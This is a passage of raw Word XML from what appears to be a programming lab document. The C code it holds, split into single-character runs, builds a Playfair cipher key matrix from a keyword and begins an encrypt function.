        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810" w:right="5382"/>
      </w:pPr>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ag[9]=1; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e J </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s put</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r>
        <w:t>n I n=s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>en(keyword); for(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;i</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>++)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:t>for(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;j</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;j</w:t>
      </w:r>
      <w:r>
        <w:t>++)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">b:       </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="43"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f(k&lt;n)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="2190" w:right="6699"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="2936"/>
      </w:pPr>
      <w:r>
        <w:t>va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>=keyword[k]-65;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="2936"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f(f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ag[v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>]==0)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="2936"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:footerReference w:type="default" r:id="rId18"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1680" w:bottom="280" w:left="1140" w:header="0" w:footer="1185" w:gutter="0"/>
          <w:pgNumType w:start="11"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</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3" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:right="257"/>
        <w:jc w:val="right"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:jc w:val="right"/>
      </w:pPr>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>se</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:right="257"/>
        <w:jc w:val="right"/>
      </w:pP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right="257"/>
        <w:jc w:val="right"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1022" w:right="1387"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="column"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>se</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">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r>
        <w:t>}</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r>
        <w:t>co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:right="-56"/>
      </w:pPr>
      <w:r>
        <w:t>go</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o c;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
      </w:pPr>
      <w:r>
        <w:br w:type="column"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>]=keyword[k];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ag[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>]=1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:t>k++;</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r>
        <w:t>k++;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:sectPr w:rsidR="00090D7C">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1680" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:num="3" w:space="720" w:equalWidth="0">
            <w:col w:w="2601" w:space="335"/>
            <w:col w:w="659" w:space="51"/>
            <w:col w:w="5434"/>
          </w:cols>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>go</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>b;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="12" w:line="240" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="29"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">c:    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="59"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>row=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1680" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>wh</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;26)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="74"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f(f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ag</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:t>=0)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="2228"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m+</w:t>
      </w:r>
      <w:r>
        <w:t>+;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="580"/>
      </w:pP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t>vo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>d f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>em</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> m</w:t>
      </w:r>
      <w:r>
        <w:t>)</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f(row&lt;5)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="1518"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f(co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>&lt;5)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="1290"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="53"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>x[row][co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>]=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>+65;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="12" w:line="240" w:lineRule="exact"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1240" w:bottom="280" w:left="1140" w:header="0" w:footer="1185" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="1" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>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769" w:right="475"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810" w:right="-56"/>
      </w:pPr>
      <w:r>
        <w:t>co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>++;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="29"/>
      </w:pPr>
      <w:r>
        <w:br w:type="column"/>
      </w:r>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:right="-56"/>
      </w:pPr>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>se</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:r>
        <w:t>{</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r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:br w:type="column"/>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7" w:line="240" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:right="4875"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1240" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:num="3" w:space="720" w:equalWidth="0">
            <w:col w:w="1441" w:space="77"/>
            <w:col w:w="373" w:space="337"/>
            <w:col w:w="7292"/>
          </w:cols>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>=0; row</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>+</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">+; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x[row][co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>]=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>+65;</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00"/>
      </w:pPr>
      <w:r>
        <w:t>vo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>d encryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
